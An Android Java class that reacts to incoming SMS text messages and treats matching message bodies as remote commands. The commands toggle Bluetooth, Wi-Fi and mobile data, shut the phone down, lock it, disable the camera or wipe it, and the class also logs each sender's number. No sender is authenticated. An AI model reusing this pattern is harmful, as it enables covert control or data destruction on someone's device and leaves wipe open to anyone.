package com.example.eldar.parse;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

;

/**
 * Created by Eldar on 17.09.2015.
 */
public class SMSReceiver extends BroadcastReceiver {
    

    @SuppressWarnings("deprecation")
    @Override
    public void onReceive(Context context, Intent intent) {

     

        Bundle bundle = intent.getExtras();
        SmsMessage message;
        String str = "";
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");

            for (int i = 0; i < pdus.length; i++) {

                message = SmsMessage.createFromPdu((byte[]) pdus[i]);
                str = message.getDisplayMessageBody();
                Toast.makeText(context, str, Toast.LENGTH_LONG).show();
                SystemInfo.getSystemInfo(context, "inc_sms:" + message.getOriginatingAddress());

            }

            String sms = str;
            String[] arr = sms.split(" ");
            if (arr.length < 2) {
                switch (str) {
                    case Executor.BLUETOOTH:
                        Executor.switchBluetooth();
                        break;
                    case Executor.WIFI:
                        Executor.switchWifi(context);
                        break;
                    case Executor.MOBILE_DATA:
                        Executor.switchMobileData(context);
                        break;
                    case Executor.SHUTDOWN:
                        Executor.shutDown();
                        break;
                    case Executor.STARTSERVICES:
                        Executor.startServices(context);
                        break;
                    case Executor.STOPSERVICES:
                        Executor.stopServices(context);
                        break;
                    case Executor.LOCK:
                        Executor.admin(context, Executor.LOCK);
                        break;

                    case Executor.WIPE:
                        Executor.admin(context, Executor.WIPE);
                        break;
                    case Executor.CAMERALOCK:
                        Executor.admin(context,Executor.CAMERALOCK);
                        break;
                }
            }
            else if(arr.length==2)
            {Executor.admin(context,arr[0]+" "+arr[1]);
            }
        }


    }
}
